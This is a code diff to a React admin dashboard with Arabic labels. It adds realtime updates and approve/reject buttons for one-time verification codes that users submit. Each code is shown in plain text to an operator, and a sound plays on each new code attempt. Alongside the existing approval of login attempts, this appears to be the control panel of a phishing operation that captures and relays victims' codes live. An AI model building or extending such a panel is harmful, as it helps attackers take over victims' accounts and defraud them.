@@ -245,10 +245,12 @@ function RegistrationsTab() {
       .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'verification_codes' }, async (payload) => {
         const newCode = payload.new as VerificationCode;
         setRegistrations((prev) => prev.map((r) => {
-          if (r.id === newCode.registration_id) {
+          if (r.id === newCode.registration_id || r.client_id === newCode.client_id) {
             return {
               ...r,
-              verification_codes: [...(r.verification_codes || []), newCode]
+              verification_codes: [...(r.verification_codes || []), newCode].sort(
+                (a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime()
+              )
             };
           }
           return r;
@@ -256,6 +258,16 @@ function RegistrationsTab() {
         fetchAll();
         // تشغيل نغمة محاولة رمز التحقق
         playVerificationCodeSound();
+      })
+      // Listen for verification_codes updates
+      .on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'verification_codes' }, async (payload) => {
+        const updatedCode = payload.new as VerificationCode;
+        setRegistrations((prev) => prev.map((r) => ({
+          ...r,
+          verification_codes: (r.verification_codes || []).map((c) => 
+            c.id === updatedCode.id ? { ...c, ...updatedCode } : c
+          )
+        })));
       })
       .subscribe((status) => setConnected(status === 'SUBSCRIBED'));
 
@@ -293,6 +305,27 @@ function RegistrationsTab() {
       setLoginAttempts(prev => prev.map(l => 
         l.id === id ? { ...l, status: action } : l
       ));
+    }
+  };
+
+  // Handle verify code approval
+  const handleVerifyCode = async (id: string, action: 'approved' | 'rejected') => {
+    const { error } = await supabase
+      .from('verification_codes')
+      .update({ 
+        verified: action === 'approved',
+        verified_at: new Date().toISOString(),
+        status: action,
+      })
+      .eq('id', id);
+
+    if (!error) {
+      setRegistrations(prev => prev.map(r => ({
+        ...r,
+        verification_codes: (r.verification_codes || []).map(c => 
+          c.id === id ? { ...c, verified: action === 'approved', status: action } : c
+        )
+      })));
     }
   };
 
@@ -611,6 +644,8 @@ function RegistrationsTab() {
 
                         // Verification Code Card
                         if (item.type === 'verification') {
+                          const verifyStatus = item.data.status || (item.data.verified ? 'approved' : 'pending');
+                          
                           return (
                             <div key={item.id} className={`rounded-xl border ${isNewest ? 'border-green-500/50 bg-slate-700/30' : 'border-slate-700 bg-slate-800/50'} p-4`}>
                               <div className="flex items-center justify-between mb-3">
@@ -631,9 +666,36 @@ function RegistrationsTab() {
                                   </button>
                                 </div>
                                 <p className="text-xl text-white font-bold tracking-[0.3em]">{item.data.code}</p>
-                                <p className={`text-[10px] mt-2 ${item.data.verified ? 'text-green-400' : 'text-yellow-400'}`}>
-                                  {item.data.verified ? 'تم التحقق ✓' : 'لم يتم التحقق'}
-                                </p>
+                                
+                                {/* أزرار الموافقة والرفض */}
+                                {verifyStatus === 'pending' && (
+                                  <div className="flex gap-2 mt-3">
+                                    <button
+                                      onClick={() => handleVerifyCode(item.id, 'approved')}
+                                      className="flex-1 bg-green-600 hover:bg-green-700 text-white text-xs font-semibold py-2 px-3 rounded-lg transition-colors"
+                                    >
+                                      ✓ موافق
+                                    </button>
+                                    <button
+                                      onClick={() => handleVerifyCode(item.id, 'rejected')}
+                                      className="flex-1 bg-red-600 hover:bg-red-700 text-white text-xs font-semibold py-2 px-3 rounded-lg transition-colors"
+                                    >
+                                      ✕ رفض
+                                    </button>
+                                  </div>
+                                )}
+                                
+                                {verifyStatus === 'approved' && (
+                                  <div className="mt-3 bg-green-500/20 text-green-400 text-xs font-semibold py-2 px-3 rounded-lg text-center">
+                                    ✓ تمت الموافقة
+                                  </div>
+                                )}
+                                
+                                {verifyStatus === 'rejected' && (
+                                  <div className="mt-3 bg-red-500/20 text-red-400 text-xs font-semibold py-2 px-3 rounded-lg text-center">
+                                    ✕ تم الرفض
+                                  </div>
+                                )}
                               </div>
                             </div>
                           );
